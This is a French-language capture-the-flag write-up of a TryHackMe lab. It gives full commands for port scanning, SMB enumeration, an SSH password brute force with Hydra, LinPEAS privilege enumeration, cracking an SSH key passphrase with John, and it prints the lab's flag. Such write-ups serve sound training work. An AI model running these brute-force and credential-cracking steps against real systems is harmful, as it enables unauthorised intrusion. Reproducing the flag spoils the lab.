### Se connecter au réseau THM 
$ sudo openvpn ELSATANICOS.ovpn


# 1 - Recon
- scan l'IP avec nmap (ce qui va permettre d'énumérer les ports ouverts sur la machine)
$ sudo nmap -p- -A -oN nmap_result 10.10.53.187 

- check le site internet en mettant l'ip de la machine (car le port 80 était ouvert)
Il n'y a rien d'intéressant sur l'accueil donc je brute force les directory caché ave gobuster
$ sudo gobuster dir -w path_wordlist -u http://10.10.53.187/ -x php,html,txt
Résultat : on a trouvé que l'index  " /development "

![[Pasted image 20220923220429.png]]

### Dev.txt
	2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I
	think it might be neat to host that on this server too. Haven't made any real 
	web apps yet, but I have tried that example you get to show off how it works 
	(and it's the REST version of the example!). Oh, and right now I'm using 
	version 2.5.12, because other versions were giving me trouble. -K
	2018-04-22: SMB has been configured. -K
	2018-04-21: I got Apache set up. Will put in our content later. -J

### J.txt
	For J:
	I've been auditing the contents of /etc/shadow to make sure we don't have any 
	weak credentials, and I was able to crack your hash really easily. You know 
	our password policy, so please follow it? Change that password ASAP.
	-K

! Infos à retenir : SMB utilise la version 2.5.12 et J utilise un mdp facile à crack

- Dans "Host script results" de nmap il y a un nom d'ordi de l'IP, se nommant "basic2"
On va donc énumérer basic2
$ sudo enum4linux 10.10.53.187
Résultat :   
![[Pasted image 20220923224743.png]]
Il y a un partage SMB avec un compte du nom d'Anonymous

![[Pasted image 20220923225606.png]]
Il y a 2 users sur basic2 : Kay et Jan
K = Kay
J= Jan

- On va ensuite se connecter en SMB sur le compte "Anonymous" :
$ smbclient //10.10.53.187/anonymous
Puis afficher les fichiers :
$ dir
![[Pasted image 20220923232054.png]]
Et enfin, télécharger le fichier staff.txt :
$ get staff.txt
Résultat : https://anonfiles.com/Z3Db2799y9/staff_txt


# 2 - Exploit 
- On sait que Jan possède un mdp fcile à crack on va donc le bruteforce
Pour cela je vais utiliser le tools "Hydra" : 
$ sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.53.187 ssh
-l = on connais déjà le login
-L = on ne connais pas le login donc on met une wordlist
-p = on connais déjà le mdp 
-P = on ne connais pas le mdp donc on met une wordlist
se connecter en ssh à Jan : $ ssh jan@10.10.53.187


# 3 - PrivEsc
- on va d'abord commencer par énumérer notre environnement avec nos connaissances
$ id : uid=1001(jan) gid=1001(jan) groups=1001(jan)
$ cat /etc/proc : Linux version 4.4.0-119-generic (buildd@lcy01-amd64-013) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) )
$ cat /etc/issue : Ubuntu 16.04.4 LTS  
$ cd /home :  jan  kay
$ cd kay : pass.bak     
Bingo ! On a trouve un fichier qui m'a l'air super intéressant mais malheuresement je n'ai pas la permission de l'éxécuter car je ne suis pas Kay

![[Pasted image 20220924161620.png]]

- Je n'ai pas d'autre idée de quoi faire donc je vais utiliser un script du nom de "LinPEAS"qui va executer toutes les commandes d'énumération possible et imaginable sur linux
Je ne peux pas l'installer sur basic2 car je n'ai pas internet je vais donc l'enregister sur un server en local de ma machine kali :
$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
$ python3 -m http.server 4000
puis installez le fichier sur basic2 : $ wget 10.18.3.17:4000/linpeas.sh
donner les perms : $ chmod +x linpeas.sh
l'éxécuter : ./linpeas.sh
résultat : https://anonfiles.com/V8Jb899eye/resultat_linpeas_txt

![[Pasted image 20220924164240.png]]

- Maintenant qu'on a trouvé la clé chiffré de Kay on va essayer de la déchiffrer  
id_rsa : https://anonfiles.com/hdZ88293y0/id_rsa
Le convertir en hash avec ssh2john.py et l'enregistrer dans un nouveau fichier :
$ python3 ssh2john.py id_rsa > id_rsa.hash
Puis le déchiffrer avec john : 
$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Résultat : ![[Pasted image 20220924171406.png]]

- On a trouvé la passphrase de la clé de Kay on va maintenant se connecter en ssh 
on va dans le même répertoire de la clé : $ cd /home/kay/.ssh
Puis, on se connecte en ssh sur la clé : $ ssh -i id_rsa kay@10.10.53.187
![[Pasted image 20220924172647.png]]

On y est !
on va ouvrir le fichier pass.bak : $ cat pass.bak

### flag : heresareallystrongpasswordthatfollowsthepasswordpolicy













